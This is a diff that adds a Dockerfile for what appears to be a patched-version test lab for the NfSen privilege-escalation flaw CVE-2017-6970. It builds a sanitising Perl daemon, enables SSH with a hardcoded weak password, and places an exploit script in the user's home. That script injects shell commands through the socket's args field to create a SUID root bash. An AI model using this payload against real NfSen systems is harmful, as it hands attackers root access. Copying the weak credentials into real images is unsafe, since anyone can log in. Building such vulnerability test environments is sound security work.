@@ -1,0 +1,149 @@
+FROM debian:bookworm-slim
+
+# Install required packages
+RUN apt-get update && apt-get install -y \
+    openssh-server \
+    perl \
+    socat \
+    bash \
+    passwd \
+    procps \
+    && rm -rf /var/lib/apt/lists/*
+
+# Setup SSH
+RUN mkdir -p /var/run/sshd && \
+    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
+    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
+    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+
+# Create low-privilege user
+RUN useradd -m -s /bin/bash lowpriv && \
+    echo 'lowpriv:password123' | chpasswd
+
+# Create NfSen directory structure
+RUN mkdir -p /var/nfsen/run && \
+    mkdir -p /var/nfsen/bin
+
+# Create a FIXED nfsen daemon that sanitizes input (patched version)
+# The fix: socket is only accessible by root, AND arguments are sanitized
+RUN cat <<'DAEMON_EOF' > /var/nfsen/bin/nfsen_daemon.pl
+#!/usr/bin/perl
+# FIXED NfSen daemon - CVE-2017-6970 patched
+# Socket is restricted to root only, and arguments are sanitized.
+
+use strict;
+use warnings;
+use Socket;
+use POSIX qw(setsid);
+
+my $socket_path = "/var/nfsen/run/nfsen.comm";
+
+unlink($socket_path);
+
+socket(my $server, AF_UNIX, SOCK_STREAM, 0) or die "socket: $!\n";
+bind($server, sockaddr_un($socket_path)) or die "bind: $!\n";
+
+# FIX: Socket is only accessible by root (mode 0700)
+chmod(0700, $socket_path);
+
+listen($server, 5) or die "listen: $!\n";
+
+my $pid = fork();
+if ($pid) {
+    open(my $pf, '>', '/var/nfsen/run/nfsen.pid');
+    print $pf $pid;
+    close($pf);
+    exit(0);
+}
+setsid();
+
+while (1) {
+    accept(my $client, $server) or next;
+
+    my $command = "";
+    my $args = "";
+
+    while (my $line = <$client>) {
+        chomp $line;
+        $line =~ s/\r//g;
+
+        if ($line eq ".") {
+            if ($command eq "run-nfdump" && $args ne "") {
+                # FIX: Sanitize arguments - remove shell metacharacters
+                $args =~ s/[^a-zA-Z0-9\s\-\.\/]//g;
+                my $cmd = "/bin/echo nfdump $args 2>&1";
+                my $output = `$cmd`;
+                print $client "OK: $output\n";
+            } else {
+                print $client "ERR: unknown command\n";
+            }
+            $command = "";
+            $args = "";
+            next;
+        }
+
+        if ($line =~ /^run-nfdump/) {
+            $command = "run-nfdump";
+        } elsif ($line =~ /^args=(.*)/) {
+            $args = $1;
+        }
+    }
+    close($client);
+}
+DAEMON_EOF
+
+RUN chmod +x /var/nfsen/bin/nfsen_daemon.pl
+
+# Create startup script
+RUN cat <<'START_EOF' > /start.sh
+#!/bin/bash
+# Start the FIXED NfSen daemon as root
+perl /var/nfsen/bin/nfsen_daemon.pl
+sleep 1
+ls -la /var/nfsen/run/nfsen.comm
+exec /usr/sbin/sshd -D
+START_EOF
+RUN chmod +x /start.sh
+
+# Create the exploit script (same as vulnerable, but it will fail)
+RUN cat <<'EXPLOIT_EOF' > /home/lowpriv/exploit.sh
+#!/bin/bash
+# CVE-2017-6970 - NfSen Local Privilege Escalation
+# This will FAIL on the fixed version because:
+# 1. Socket permissions are restricted to root only (0700)
+# 2. Arguments are sanitized to remove shell metacharacters
+
+echo "[*] CVE-2017-6970 NfSen Local Privilege Escalation"
+echo "[*] Connecting to NfSen UNIX domain socket..."
+
+perl -e '
+use Socket;
+socket(my $nfsend, AF_UNIX, SOCK_STREAM, 0) or die "socket: $!\n";
+connect($nfsend, sockaddr_un("/var/nfsen/run/nfsen.comm")) or die "connect: $!\n";
+print $nfsend "run-nfdump\nargs=-h \$(cp /bin/bash /tmp/rootbash)\n.\nrun-nfdump\nargs=-h \$(chmod u+s /tmp/rootbash)\n.\n";
+sleep 1;
+close($nfsend);
+'
+
+sleep 2
+
+echo "[*] Checking for SUID bash..."
+if [ -f /tmp/rootbash ] && [ -u /tmp/rootbash ]; then
+    echo "[+] SUCCESS! SUID root bash created at /tmp/rootbash"
+    /tmp/rootbash -p -c 'id; whoami'
+else
+    echo "[-] Exploit FAILED (as expected on patched system)"
+    ls -la /tmp/rootbash 2>/dev/null
+fi
+EXPLOIT_EOF
+
+RUN chown lowpriv:lowpriv /home/lowpriv/exploit.sh && \
+    chmod +x /home/lowpriv/exploit.sh
+
+# Verify directory structure
+RUN ls -la /var/nfsen/run/ && \
+    ls -la /var/nfsen/bin/nfsen_daemon.pl && \
+    echo "NfSen FIXED daemon installed"
+
+EXPOSE 22
+CMD ["/start.sh"]
